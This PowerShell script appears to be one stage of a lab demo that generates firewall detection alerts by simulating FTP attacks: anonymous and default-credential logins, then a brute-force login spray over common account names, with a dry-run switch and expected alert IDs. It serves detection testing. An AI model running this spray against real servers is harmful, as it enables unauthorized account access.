<#
    Stage 2 - Multiple suspicious FTP login attempts  (EAL: credential access)
    ==========================================================================
    The attacker sprays many FTP logins in quick succession - a brute-force
    pattern the firewall flags across the session.

      EAL alert : 'Multiple Suspicious FTP Login Attempts'
      ATT&CK    : Initial Access / Credential Access (TA0001/TA0006) /
                  Brute Force (T1110), Valid Accounts (T1078)
      Severity  : Low   Source: PAN Firewall EAL Logs
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_traffic.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 2 (Collection/Exfil staging): FTP to attacker $($cfg.FtpServer)" "INFO"
# First, anonymous / default-credential login (drop channel to the attacker FTP).
Invoke-FtpLogin -Server $cfg.FtpServer -User "anonymous" -Pass "anon@x.com" -Label "anonymous"
Invoke-FtpLogin -Server $cfg.FtpServer -User "ftp"       -Pass "ftp"        -Label "default-creds"
# Then a brute-force spray.
$users = @("administrator","backup","svc_ftp","oracle","www","test","root","operator")
for ($i=0; $i -lt $cfg.FtpBruteAttempts; $i++) {
    $u = $users[$i % $users.Count]
    Invoke-FtpLogin -Server $cfg.FtpServer -User $u -Pass "P@ss$i!" -Label "brute #$($i+1)"
}
Write-Stage "STAGE 2 done. Expect EAL: 'FTP Anonymous/Default Credentials' (68d806a3) + 'Multiple Suspicious FTP Login Attempts' (91db0f65)." "OK"
